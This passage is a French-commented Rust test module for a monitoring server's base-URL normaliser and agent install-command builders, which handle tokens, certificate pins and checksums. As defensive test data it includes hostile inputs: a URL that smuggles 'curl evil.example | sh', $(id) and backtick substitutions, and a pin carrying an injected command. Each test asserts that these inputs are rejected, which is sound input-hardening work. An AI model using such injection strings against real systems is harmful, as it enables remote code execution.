        let bind = "0.0.0.0:8080".parse().unwrap();
        assert_eq!(
            normalise_base_url(Some("https://monit.maison.lan/"), bind),
            "https://monit.maison.lan"
        );
    }

    #[test]
    fn the_base_url_is_always_https_and_cannot_carry_a_command() {
        let bind = "0.0.0.0:8080".parse().unwrap();
        // Faux derrière un proxy, mais visiblement faux : l'utilisateur corrige la
        // commande plutôt que de se demander pourquoi rien ne remonte.
        assert_eq!(normalise_base_url(None, bind), "https://0.0.0.0:8080");
        assert_eq!(normalise_base_url(Some("   "), bind), "https://0.0.0.0:8080");
        // Une adresse en clair, ou sans schéma, passe en HTTPS.
        assert_eq!(normalise_base_url(Some("http://nas:8080/"), bind), "https://nas:8080");
        assert_eq!(normalise_base_url(Some("nas.lan:8080"), bind), "https://nas.lan:8080");
        let ipv6 = normalise_base_url(Some("HTTPS://[fd00::1]:8080"), bind);
        assert_eq!(ipv6, "https://[fd00::1]:8080");
        // Rien qui sorte de l'URL dans le terminal.
        for hostile in [
            "https://nas; curl evil.example | sh",
            "https://nas$(id)",
            "https://nas`id`",
            "https://nas|sh",
            "https://nas'",
            "https://user@evil.example",
            "ftp://nas",
            "https:///etc",
        ] {
            let url = normalise_base_url(Some(hostile), bind);
            assert_eq!(url, "https://0.0.0.0:8080", "{hostile}");
        }
    }

    const PIN: &str = "sha256//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=";

    #[test]
    fn the_install_command_is_the_one_promised_in_the_documentation() {
        assert_eq!(
            install_linux("https://serveur:8080", "dmon_abc", &[], None),
            "curl -sSL https://serveur:8080/install.sh | sh -s -- --token=dmon_abc --url=https://serveur:8080"
        );
        let windows = install_windows("https://serveur:8080", "dmon_abc", &[], None);
        assert!(windows.contains("irm https://serveur:8080/install.ps1"), "{windows}");
        assert!(windows.starts_with("[Net.ServicePointManager]::SecurityProtocol"), "{windows}");
        assert!(!windows.contains("http://"), "{windows}");
    }

    #[test]
    fn the_install_commands_carry_the_agent_channel_and_its_pin() {
        let pin = "a".repeat(64);
        let params = InstallParams {
            base_url: "https://s:8080".into(),
            agent_url: Some("https://s:8443".into()),
            ca_pin: Some(pin.clone()),
            checksums: Vec::new(),
            linux_template: String::new(),
            windows_template: String::new(),
            via_relay: None,
            https_pin: None,
        };
        let linux = params.linux_command("dmon_abc");
        assert!(linux.ends_with(&format!(" --tls-url=https://s:8443 --ca-pin={pin}")), "{linux}");
        assert!(linux.contains("--token=dmon_abc"));
        let windows = params.windows_command(TOKEN_PLACEHOLDER);
        assert!(windows.contains("-Token {TOKEN}"), "{windows}");
        assert!(windows.ends_with(&format!(" -TlsUrl https://s:8443 -CaPin {pin}")));
    }

    #[test]
    fn over_a_self_signed_certificate_both_commands_pin_the_server_key() {
        let params = InstallParams {
            base_url: "https://nas.lan:8080".into(),
            agent_url: None,
            ca_pin: None,
            checksums: Vec::new(),
            linux_template: String::new(),
            windows_template: String::new(),
            via_relay: None,
            https_pin: Some(PIN.into()),
        };
        let linux = params.linux_command("dmon_abc");
        assert!(
            linux.starts_with(&format!(
                "curl -sSL -k --pinnedpubkey {PIN} https://nas.lan:8080/install.sh | sh -s"
            )),
            "{linux}"
        );
        assert!(linux.contains(&format!(" --pinned-key={PIN}")), "{linux}");
        assert!(linux.contains(" --url=https://nas.lan:8080"), "{linux}");
        // PowerShell : la clé est vérifiée par le rappel de validation avant que
        // le script ne soit lu, puis passée à l'installateur.
        let windows = params.windows_command("dmon_abc");
        assert!(!windows.contains("http://"), "{windows}");
        assert!(windows.contains("ServerCertificateValidationCallback"), "{windows}");
        assert!(windows.contains(&format!("-ceq '{PIN}'")), "{windows}");
        assert!(
            windows.contains("DownloadString('https://nas.lan:8080/install.ps1')"),
            "{windows}"
        );
        assert!(windows.contains(&format!(" -Url https://nas.lan:8080 -PinnedKey {PIN}")));
        assert!(windows.contains(P256_SPKI_PREFIX));
        // Le rappel précède le téléchargement.
        let callback = windows.find("ServerCertificateValidationCallback").unwrap();
        assert!(callback < windows.find("DownloadString").unwrap());
        // Les arguments de l'installateur commencent bien à -Token.
        let arguments = crate::api::ad_deploy::installer_arguments(&windows).unwrap();
        assert!(arguments.starts_with("-Token dmon_abc -Url https://nas.lan:"), "{arguments}");
    }

    #[test]
    fn a_malformed_pin_never_reaches_a_command() {
        for pin in ["sha256//AAAA", "sha256//A'; calc; '", "md5//x", ""] {
            let linux = install_linux("https://s", "t", &[], Some(pin));
            assert!(!linux.contains("pinnedpubkey"), "{pin}");
            let windows = install_windows("https://s", "t", &[], Some(pin));
            assert!(!windows.contains("ServerCertificateValidationCallback"), "{pin}");
        }
        assert_eq!(clean_pin(Some(PIN)), Some(PIN));
    }

    #[test]
    fn the_install_commands_carry_the_checksums_of_their_platforms() {
        let checksums = vec![
            ("linux-x86_64".to_string(), "a".repeat(64)),
            ("linux-aarch64".to_string(), "b".repeat(64)),
            ("windows-x86_64".to_string(), "c".repeat(64)),
        ];
        let linux = install_linux("https://s:8080", "dmon_abc", &checksums, None);
        assert!(
            linux.ends_with(&format!(
                " --sha256=linux-x86_64:{},linux-aarch64:{}",
                "a".repeat(64),
                "b".repeat(64)
            )),
            "{linux}"
        );
        assert!(!linux.contains(&"c".repeat(64)));
        let windows = install_windows("https://s:8080", "dmon_abc", &checksums, Some(PIN));
        assert!(windows.ends_with(&format!(" -Sha256 windows-x86_64:{}", "c".repeat(64))));
        assert!(!windows.contains(&"a".repeat(64)));
    }
}
